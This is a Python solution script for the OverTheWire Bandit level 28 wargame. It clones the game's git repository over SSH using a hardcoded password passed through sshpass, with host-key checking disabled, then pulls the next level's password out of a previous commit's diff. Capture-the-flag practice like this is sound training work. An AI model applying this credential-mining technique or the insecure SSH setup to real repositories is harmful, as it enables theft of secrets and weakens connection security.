#!/usr/bin/python3.9

"""This script is a solution to Overthewire Bandit level 28."""

from git import Repo
from os import environ
from tempfile import TemporaryDirectory
from shutil import which

if which("sshpass") is None:
    exit("[ERROR] sshpass command not found.")

temp_dir = TemporaryDirectory()

environ['GIT_SSH_COMMAND'] = ' '.join([
    "sshpass -p AVanL161y9rsbcJIsFHuw35rjaOM19nR", 
    "ssh -o StrictHostKeyChecking=no",
    "-o UserKnownHostsFile=/dev/null -p 2220"])

path = "/home/bandit28-git/repo"
remote = f"ssh://bandit28-git@bandit.labs.overthewire.org{path}"

repo = Repo.clone_from(remote, temp_dir.name)

curr,prev = list(repo.iter_commits(max_count=2))

diff_index = prev.diff(curr)

for diff in diff_index: 
    password = diff.a_blob.data_stream.read().decode()
    password = password.strip().split(" ")[-1]

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL]",
        f"[Password({len(password)}): {password}]")

temp_dir.cleanup()
